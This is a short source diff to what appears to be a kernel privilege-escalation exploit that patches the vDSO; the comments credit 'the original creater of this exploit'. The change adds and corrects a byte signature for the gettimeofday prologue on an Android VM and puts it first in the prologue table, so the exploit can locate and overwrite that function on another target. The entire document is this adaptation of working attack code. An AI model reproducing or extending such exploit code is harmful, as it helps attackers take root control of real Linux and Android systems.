@@ -76,6 +76,11 @@ static char child_stack[8192];
 static struct vdso_patch vdso_patch[2];
 
 static struct prologue prologues[] = {
+  // the following is the gettimeofday function signature in the android VM
+  /* push rbp; mov rbp, rsp; push r13 */ 
+  { "\x55\x48\x89\xe5\x41\x55", 6 },
+	// the following are gettimeofday signatures from other vdso versions
+	// these are from the original creater of this exploit
   /* push rbp; mov rbp, rsp; lfence */
   { "\x55\x48\x89\xe5\x0f\xae\xe8", 7 },
   /* push rbp; mov rbp, rsp; push r14 */
@@ -86,9 +91,6 @@ static struct prologue prologues[] = {
   { "\x55\x48\x89\xe5\x66\x66\x90", 7 },
   /* push rbp; cmp edi, 1; mov rbp, rsp */
   { "\x55\x83\xff\x01\x48\x89\xe5", 7 },
-  // the following is the function signature in the android VM
-  /* push rbp; mov rbp, rsp; push r13 */ 
-  { "\x55\x48\x89\xe5\x41\x54", 6 },
 };
 
 
